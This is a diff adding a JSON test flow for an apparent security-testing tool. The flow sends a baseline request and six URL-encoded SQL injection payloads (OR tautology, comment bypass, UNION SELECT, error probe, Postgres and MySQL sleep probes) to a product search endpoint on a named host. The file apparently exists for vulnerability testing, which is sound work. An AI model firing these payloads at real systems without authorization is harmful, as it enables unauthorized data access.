@@ -1,0 +1,85 @@
+{
+  "id": "flow_sql_injection_product_search",
+  "name": "SQL Injection: Product Search (Non-Destructive)",
+  "description": "Exercises the injection-prone product search endpoint with baseline, filter-bypass, error-based, and time-based SQLi-style payloads. Uses query string injection only; no data is modified.",
+  "headers": {
+    "Accept": "application/json"
+  },
+  "staticVars": {
+    "baseUrl": "https://bla-bypass.ase-team.com",
+    "baselineQuery": "Mouse",
+    "injectionQuerySimple": "%27%20OR%20%271%27%3D%271",
+    "injectionQueryComment": "%27%20OR%201%3D1%20--",
+    "injectionQueryUnion": "%27%20UNION%20SELECT%20*%20FROM%20products%20--",
+    "injectionQueryError": "%27",
+    "injectionQuerySleepPostgres": "%27%3B%20SELECT%20pg_sleep(2)%3B--%20",
+    "injectionQuerySleepMySql": "%27%20OR%20SLEEP(2)%20--%20"
+  },
+  "steps": [
+    {
+      "id": "step_product_search_baseline",
+      "name": "Baseline Product Search",
+      "type": "request",
+      "method": "GET",
+      "url": "{{baseUrl}}/api/products/search?name={{baselineQuery}}",
+      "onFailure": "stop"
+    },
+    {
+      "id": "step_product_search_injection_simple",
+      "name": "Product Search SQLi (Simple OR)",
+      "type": "request",
+      "method": "GET",
+      "url": "{{baseUrl}}/api/products/search?name={{injectionQuerySimple}}",
+      "onFailure": "continue"
+    },
+    {
+      "id": "step_product_search_injection_comment",
+      "name": "Product Search SQLi (Comment)",
+      "type": "request",
+      "method": "GET",
+      "url": "{{baseUrl}}/api/products/search?name={{injectionQueryComment}}",
+      "onFailure": "continue"
+    },
+    {
+      "id": "step_product_search_injection_union",
+      "name": "Product Search SQLi (Union)",
+      "type": "request",
+      "method": "GET",
+      "url": "{{baseUrl}}/api/products/search?name={{injectionQueryUnion}}",
+      "onFailure": "continue"
+    },
+    {
+      "id": "step_product_search_injection_error",
+      "name": "Product Search SQLi (Error-Based)",
+      "type": "request",
+      "method": "GET",
+      "url": "{{baseUrl}}/api/products/search?name={{injectionQueryError}}",
+      "onFailure": "continue"
+    },
+    {
+      "id": "step_product_search_injection_sleep_postgres",
+      "name": "Product Search SQLi (Time-Based, Postgres)",
+      "type": "request",
+      "method": "GET",
+      "url": "{{baseUrl}}/api/products/search?name={{injectionQuerySleepPostgres}}",
+      "onFailure": "continue"
+    },
+    {
+      "id": "step_product_search_injection_sleep_mysql",
+      "name": "Product Search SQLi (Time-Based, MySQL)",
+      "type": "request",
+      "method": "GET",
+      "url": "{{baseUrl}}/api/products/search?name={{injectionQuerySleepMySql}}",
+      "onFailure": "continue"
+    }
+  ],
+  "visualLayout": {
+    "step_product_search_baseline": { "x": 50, "y": 50 },
+    "step_product_search_injection_simple": { "x": 250, "y": 50 },
+    "step_product_search_injection_comment": { "x": 450, "y": 50 },
+    "step_product_search_injection_union": { "x": 650, "y": 50 },
+    "step_product_search_injection_error": { "x": 50, "y": 150 },
+    "step_product_search_injection_sleep_postgres": { "x": 250, "y": 150 },
+    "step_product_search_injection_sleep_mysql": { "x": 450, "y": 150 }
+  }
+}
